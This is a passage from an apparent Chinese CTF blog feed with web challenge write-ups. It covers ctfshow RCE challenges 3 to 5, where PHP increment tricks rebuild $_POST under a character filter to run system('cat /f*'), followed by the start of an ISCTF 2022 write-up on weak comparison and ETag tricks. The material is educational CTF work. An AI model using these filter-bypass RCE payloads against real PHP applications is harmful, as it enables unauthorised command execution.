class="comment">//è¿™é‡Œæœ€åä¸€ä¸ªä¹Ÿæ˜¯è¿›è¡Œäº†++çš„ï¼Œæ‰€ä»¥æœ€åä¸€ä½æ˜¯T, $_ = _POST</span></span><br><span class="line"><span class="variable">$$_</span>[_](<span class="variable">$$_</span>[<span class="number">0</span>]); <span class="comment">// $_POST[_]($_POST[0]);</span></span><br></pre></td></tr></table></figure><p>è‡³äºä¸ºä»€ä¹ˆä½¿ç”¨POSTï¼Œå› ä¸ºNä¸‹é¢å°±æœ‰postçš„æ‰€æœ‰å­—æ¯ï¼Œè€Œä¸”æ¯”è¾ƒè¿‘ï¼Œè€Œä¸”phpçš„asciiä¸èƒ½è‡ªå‡ï¼Œæ‰€ä»¥ç»„GETè¦åºŸå¾ˆå¤šæ—¶é—´ã€‚</p><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$_=((0/0)._)[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[0]);&amp;_=system&amp;0=cat /f*</span><br></pre></td></tr></table></figure><h2 id="RCEæŒ‘æˆ˜4"><a href="#RCEæŒ‘æˆ˜4" class="headerlink" title="RCEæŒ‘æˆ˜4"></a>RCEæŒ‘æˆ˜4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶Y4tackerä½¬åœ¨åƒç“œæ¯æŠ•ç¨¿çš„shellmeæ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">84</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z1-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>fuzzä¸€ä¸‹ï¼Œå‘ç°å¯ç”¨çš„å­—ç¬¦åªæœ‰</p><p>$ ( ) + , . / 0 ; = [ ] _</p><p>è¦æ±‚é•¿åº¦å°äº84</p></blockquote><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=(_/_._)[<span class="number">0</span>]; <span class="comment">//æ›´çŸ­çš„N</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">//O</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++; </span><br><span class="line"><span class="comment">//è¿™é‡Œæ˜¯è¿›è¡Œäº†++çš„ï¼Œæ‰€ä»¥$_ç­‰äºP, $__=PO.</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// Q</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$__</span>.<span class="variable">$_</span>.++<span class="variable">$_</span>; <span class="comment">//è¿™é‡Œæœ€åä¸€ä¸ªä¹Ÿæ˜¯è¿›è¡Œäº†++çš„ï¼Œæ‰€ä»¥æœ€åä¸€ä½æ˜¯T, $_ = _POST</span></span><br><span class="line"><span class="variable">$$_</span>[_](<span class="variable">$$_</span>[<span class="number">1</span>]); <span class="comment">// $_POST[_]($_POST[1]);</span></span><br></pre></td></tr></table></figure><p>RCEæŒ‘æˆ˜3çš„playloadä¹Ÿèƒ½ç”¨ï¼Œä½†æ˜¯åˆå°è¯•å‹åˆ°äº†78ä¸ªå­—ç¬¦ã€‚</p><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$_=(_/_._)[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[0]);&amp;_=system&amp;0=cat /f*</span><br></pre></td></tr></table></figure><h2 id="RCEæŒ‘æˆ˜5"><a href="#RCEæŒ‘æˆ˜5" class="headerlink" title="RCEæŒ‘æˆ˜5"></a>RCEæŒ‘æˆ˜5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//æœ¬é¢˜çµæ„Ÿæ¥è‡ªç ”ç©¶Y4tackerä½¬åœ¨åƒç“œæ¯æŠ•ç¨¿çš„shellmeæ—¶æƒ³åˆ°çš„å§¿åŠ¿ï¼Œå¤ªæ£’å•¦~ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">73</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é™åˆ¶73ä¸ªå­—ç¬¦ï¼Œè€Œä¸”0ä¹Ÿä¸å¯ä»¥ç”¨äº†</p><p><code>$_=(_/_._)[_];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.++$_.++$_;$$_[_]($$_[0]);</code></p><p>é‡æ–°fuzzï¼Œå˜é‡è¿™è¾¹è¿˜èƒ½å†ç¼©ï¼Œå°è¯•ä¸€äº›å¸Œè…Šå­—ç¬¦ç­‰ä¸å¯è§å­—ç¬¦ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$%FF=<span class="title function_ invoke__">_</span>(%FF/%FF)[%FF];<span class="comment">//N</span></span><br><span class="line"><span class="variable">$_</span>=++$%FF; <span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>=_.++$%FF.<span class="variable">$_</span>;<span class="comment">//_PO</span></span><br><span class="line">$%FF++;<span class="comment">//Q</span></span><br><span class="line">$%FF++;<span class="comment">//R</span></span><br><span class="line"><span class="variable">$_</span>.=++$%FF.++$%FF;<span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[%FF](<span class="variable">$$_</span>[_]);</span><br></pre></td></tr></table></figure><p>æé™çš„73ä¸ªå­—ç¬¦ã€‚</p><p>çœ‹åˆ«çš„å¸ˆå‚…çš„wpï¼ŒPHPåœ¨åšå­—ç¬¦ä¸²æ‹¼æ¥çš„è¿‡ç¨‹ä¸­ï¼ˆ.æ“ä½œï¼‰ï¼Œæ˜¯ä¸€ä¸ªä»å·¦åˆ°å³é€’å½’çš„è¿‡ç¨‹ï¼Œè€Œ<code>++</code>æ“ä½œç±»ä¼¼äºä¸€ä¸ªå‡½æ•°ï¼Œphpåœ¨æ‰§è¡Œå®Œå‡½æ•°åï¼Œå†åšæ‹¼æ¥çš„æ“ä½œï¼Œè¿™é‡Œå¯ä»¥<code>$_=$a.$a++;</code>æ¥æ‹¼æ¥POã€‚</p><p>é¢„æœŸè§£ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">_</span>(a/a)[a];<span class="comment">//ç›¸å½“äºgettext(0/0)[0],å¾—åˆ°N</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$a</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>=_.++<span class="variable">$a</span>.<span class="variable">$_</span>;<span class="comment">//_PO</span></span><br><span class="line"><span class="variable">$a</span>++;<span class="variable">$a</span>++;<span class="comment">//R</span></span><br><span class="line"><span class="variable">$_</span>.=++<span class="variable">$a</span>.++<span class="variable">$a</span>;<span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[a](<span class="variable">$$_</span>[_]);<span class="comment">//$_POST[a]($_POST[_])</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè§‚å¯Ÿåˆ°phpinfoå®‰è£…äº†ä¸€ä¸ªæ‰©å±•gettextï¼Œè¯¥æ‰©å±•æ”¯æŒå‡½æ•°<code>_()</code> ,ç›¸å½“äº<code>gettext()</code>ï¼Œç›´æ¥è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ã€‚å¦å¤–ï¼Œå…¶å®æ•°ç»„ä¸‹æ ‡ä½¿ç”¨æœªå®šä¹‰å¸¸é‡ï¼Œphpä¼šwarningï¼Œä½†æ˜¯å¯ä»¥ç»§ç»­è¿è¡Œï¼Œå¹¶è¿”å›ä¸‹æ ‡ä¸º0çš„å­—ç¬¦ï¼ˆç°è±¡æ˜¯è¿™æ ·ä½†æ˜¯å®é™…æœºåˆ¶éœ€è¦çœ‹phpæºç ï¼‰ã€‚å…¶ä½™çŸ¥è¯†ç‚¹ä¸Šé¢éƒ½å·²ç»è®²è¿‡äº†ï¼Œå‰©ä¸‹çš„å°±æ˜¯é ç»éªŒå’Œç§¯ç´¯å¯¹payloadè¿›è¡Œç²¾ç®€ã€‚</p><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$%ff=_(%ff/%ff)[%ff];$_=%2b%2b$%ff;$_=_.%2b%2b$%ff.$_;$%ff%2b%2b;$%ff%2b%2b;$_.=%2b%2b$%ff.%2b%2b$%ff;$$_[_]($$_[%ff]);&amp;_=system&amp;%ff=cat /f*</span><br></pre></td></tr></table></figure><p>å¤§ä½¬ä»¬çš„ä¸åŒé•¿åº¦playloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$_=[].[];$__=&#x27;&#x27;;$_=$_[&#x27;&#x27;];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$_=++$_;$_=++$_;$__=$_.$__;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$___=&#x27;_&#x27;;$___.=$__;($$___[_])($$___[__]);</span></span><br><span class="line"><span class="comment">//246</span></span><br><span class="line"><span class="comment">//$_=[].[];$__=&#x27;&#x27;;$_=$_[&#x27;&#x27;];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$_=++$_;$_=++$_;$__=$_.$__;$_=($_/$_.$_)[&#x27;&#x27;];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$___=&#x27;_&#x27;;$___.=$__;($$___[_])($$___[__]);</span></span><br><span class="line"><span class="comment">//208</span></span><br><span class="line"><span class="comment">//$_=[].[];$__=&#x27;&#x27;;$_=$_[&#x27;&#x27;];$_=($_/$_.$_)[&#x27;&#x27;];$_=++$_;$__.=$_;$_=++$_;$__=$_.$__;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$_=++$_;$__.=$_;$___=&#x27;_&#x27;;$___.=$__;$__=$$___;$__[&#x27;_&#x27;]($__[&#x27;__&#x27;]);</span></span><br><span class="line"><span class="comment">//176</span></span><br><span class="line"><span class="comment">//$_=[].[];$_=$_[&#x27;&#x27;];$_=($_/$_.$_)[&#x27;&#x27;];$_++;$__.=$_;$_++;$__=$_.$__;$_++;$_++;$_++;$__.=$_;$_=_.$__.++$_;($_[_])($_[__]);</span></span><br><span class="line"><span class="comment">//119</span></span><br><span class="line"><span class="comment">//$_=[].[];$_=$_[&#x27;&#x27;];$_=($_/$_.$_)[&#x27;&#x27;];$_++;$__=$_;$_++;$___=$_;$_++;$_++;$_++;$_=_.$___.$__.$_.++$_;($$_[_])($$_[__]);</span></span><br><span class="line"><span class="comment">//117</span></span><br><span class="line"><span class="comment">//$_=[].[];$_=$_[&#x27;&#x27;];$_=($_/$_.$_)[&#x27;&#x27;];$_++;$__=$_;$_++;$__=$_.$__;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[__]);</span></span><br><span class="line"><span class="comment">//113</span></span><br><span class="line"><span class="comment">//$_=([].[])[&#x27;&#x27;];$_=($_/$_.$_)[&#x27;&#x27;];$_++;$__=$_;$_++;$__=$_.$__;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[__]);</span></span><br><span class="line"><span class="comment">//109</span></span><br><span class="line"><span class="comment">//$_=([].[])[0];$_=($_/$_.$_)[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[1]);</span></span><br><span class="line"><span class="comment">//95</span></span><br><span class="line"><span class="comment">//$_=(0/0).[];$_=$_[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[0]);</span></span><br><span class="line"><span class="comment">//85</span></span><br><span class="line"><span class="comment">//$_=((0/0).[])[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[0]); </span></span><br><span class="line"><span class="comment">//82</span></span><br><span class="line"><span class="comment">//$_=((_/_).[])[_];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[__]);</span></span><br><span class="line"><span class="comment">//82</span></span><br><span class="line"><span class="comment">//$_=(_/_._)[_];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[__]);</span></span><br><span class="line"><span class="comment">//79</span></span><br><span class="line"><span class="comment">//$_=(_/_._)[_];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_].$$_[__];</span></span><br><span class="line"><span class="comment">//78</span></span><br><span class="line"><span class="comment">//$_=(_/_._)[_];$_++;$Î±=$_.$_++;$_++;$_++;$_++;$_=_.$Î±.$_.++$_;$$_[_]($$_[__]);</span></span><br><span class="line"><span class="comment">//77</span></span><br><span class="line"><span class="comment">//$_=(_/_._)[_];$_++;$%FA=$_.$_++;$_++;$_++;$_=_.$%FA.++$_.++$_;$$_[_]($$_[%FA]);</span></span><br><span class="line"><span class="comment">//73</span></span><br></pre></td></tr></table></figure><p>62ä½å†™æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PHP</span><br><span class="line">$_=_(%FA.%FA)[_];//N</span><br><span class="line">$%FA=++$_;//O</span><br><span class="line">$$%FA[$%FA=_.++$_.$%FA[$_++/$_++].++$_.++$_]($$%FA[_]); //$_POST[_POST]($_POST[_])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> è‡ªå¢ </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCTF 2022 Web WP</title>
      <link href="/posts/cbb4.html"/>
      <url>/posts/cbb4.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="EASY-PHP01"><a href="#EASY-PHP01" class="headerlink" title="EASY-PHP01"></a>EASY-PHP01</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./flag114514.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$ISCTF</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ISCTF</span> == <span class="number">114514</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ISCTF</span> === <span class="string">&quot;114514&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;å¥½è‡­å•Š&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;= == === != !==&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä»€ä¹ˆæ˜¯POSTï¼Ÿ&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot; ä»€ä¹ˆæ˜¯GETï¼Ÿ&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>phpå¼±ç±»å‹æ¯”è¾ƒã€‚ä¼ å…¥ISCTF=114514aå³å¯ã€‚</p><p>è¿™é‡Œç”¨åˆ°äº†PHPå¼±æ¯”è¾ƒçš„çŸ¥è¯†</p><blockquote><p>== ï¼šå¼±ç­‰äºã€‚åœ¨æ¯”è¾ƒå‰ä¼šå…ˆæŠŠä¸¤ç§å­—ç¬¦ä¸²ç±»å‹è½¬æˆç›¸åŒçš„å†è¿›è¡Œæ¯”è¾ƒã€‚ç®€å•çš„è¯´ï¼Œå®ƒä¸ä¼šæ¯”è¾ƒå˜é‡ç±»å‹ï¼Œåªæ¯”è¾ƒå€¼ã€‚è‡³äºæ€ä¹ˆè½¬æ¢åç»­ä¼šå†èµ˜è¿°ã€‚<br>=== ï¼šå¼ºç­‰äºã€‚åœ¨æ¯”è¾ƒå‰ä¼šå…ˆåˆ¤æ–­ä¸¤ç§å­—ç¬¦ä¸²ç±»å‹æ˜¯å¦ç›¸åŒå†è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç±»å‹ä¸åŒç›´æ¥è¿”å›ä¸ç›¸ç­‰ã€‚æ—¢æ¯”è¾ƒå€¼ä¹Ÿæ¯”è¾ƒç±»å‹ã€‚</p></blockquote><h2 id="FakeWeb"><a href="#FakeWeb" class="headerlink" title="FakeWeb"></a>FakeWeb</h2><p>æ‰“å¼€é“¾æ¥ä¸€çœ‹å¾ˆå¿«å°±é‡å®šå‘åˆ°åˆ«çš„ç½‘ç«™äº†ï¼ŒæŠ“åŒ…çœ‹çœ‹ã€‚</p><p><img src="https://s2.loli.net/2023/08/04/7YtpVsFUvSw2zAH.png" alt="image-20221105093638578.png"></p><p>çœ‹åˆ°ä¸€ä¸ªå¥‡æ€ªçš„If-None-Matchå’ŒETagï¼Œè¡¥å……ä¸‹çŸ¥è¯†ç‚¹ï¼š</p><p>ETagæ˜¯HTTP1.1ä¸­æ‰åŠ å…¥çš„ä¸€ä¸ªå±æ€§ï¼Œç”¨æ¥å¸®åŠ©æœåŠ¡å™¨æ§åˆ¶Webç«¯çš„ç¼“å­˜éªŒè¯ã€‚</p><blockquote><p>å®ƒçš„åŸç†æ˜¯è¿™æ ·çš„ï¼Œå½“æµè§ˆå™¨è¯·æ±‚æœåŠ¡å™¨çš„æŸé¡¹èµ„æº(A)æ—¶, æœåŠ¡å™¨æ ¹æ®Aç®—å‡ºä¸€ä¸ªå“ˆå¸Œå€¼(3f80f-1b6-3e1cb03b)å¹¶é€šè¿‡ ETagè¿”å›ç»™æµè§ˆå™¨ï¼Œæµè§ˆå™¨æŠŠâ€3f80f-1b6-3e1cb03bâ€ å’Œ A åŒæ—¶ç¼“å­˜åœ¨æœ¬åœ°ï¼Œå½“ä¸‹æ¬¡å†æ¬¡å‘æœåŠ¡å™¨è¯·æ±‚Aæ—¶ï¼Œä¼šé€šè¿‡ç±»ä¼¼ If-None-Match: â€œ3f80f-1b6-3e1cb03bâ€çš„è¯·æ±‚å¤´æŠŠETagå‘é€ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å†æ¬¡è®¡ç®—Açš„å“ˆå¸Œå€¼å¹¶å’Œæµè§ˆå™¨è¿”å›çš„å€¼åšæ¯”è¾ƒï¼Œå¦‚æœå‘ç°Aå‘ç”Ÿäº†å˜åŒ–å°±æŠŠAè¿”å›ç»™æµè§ˆå™¨(200)ï¼Œå¦‚æœå‘ç°Aæ²¡æœ‰å˜åŒ–å°±ç»™æµè§ˆå™¨è¿”å›ä¸€ä¸ª304æœªä¿®æ”¹ã€‚è¿™æ ·é€šè¿‡æ§åˆ¶æµè§ˆå™¨ç«¯çš„ç¼“å­˜ï¼Œå¯ä»¥èŠ‚çœæœåŠ¡å™¨çš„å¸¦å®½ï¼Œå› ä¸ºæœåŠ¡å™¨ä¸éœ€è¦æ¯æ¬¡éƒ½æŠŠå…¨é‡æ•°æ®è¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p></blockquote><p>å¤§æ¦‚æ„æ€æ˜¯æ¯”è¾ƒIf-None-Matchå’ŒETagï¼Œå¦‚æœä¸¤è€…ä¸ç›¸ç­‰åˆ™é‡æ–°è¿”å›èµ„æºï¼Œå¦åˆ™ä¸è¿”å›ã€‚</p><p>æˆ‘ä»¬å°†If-None-Matchä¿®æ”¹ä¹‹åå†å‘åŒ…ã€‚å°±å¾—åˆ°äº†flagã€‚</p><p><img src="https://s2.loli.net/2023/08/04/uC483KqpvROMIE5.png" alt="image-20221105093946826.png"></p><p>åº”è¯¥æ˜¯ä¸ªéé¢„æœŸå§ï¼Œåœ¨sitemapé‡Œèƒ½çœ‹åˆ°burpçˆ¬è¿‡çš„è®°å½•ï¼Œé‡Œé¢ä¹Ÿèƒ½çœ‹åˆ°flagã€‚</p><h2 id="EASY-PHP02"><a href="#EASY-PHP02" class="headerlink" title="EASY-PHP02"></a>EASY-PHP02</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;need_time_to_change&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$YOUR_NAME</span> = <span class="variable">$_GET</span>[<span class="string">&quot;NAME&quot;</span>];</span><br><span class="line"><span class="variable">$GET1</span> = <span class="variable">$_POST</span>[<span class="string">&quot;GET1&quot;</span>];</span><br><span class="line"><span class="variable">$GET2</span> = <span class="variable">$_POST</span>[<span class="string">&quot;GET2&quot;</span>];</span><br><span class="line"><span class="variable">$POST1</span> = <span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>];</span><br><span class="line"><span class="variable">$POST2</span> = <span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$YOUR_NAME</span>))&#123;</span><br><span class="line">    <span 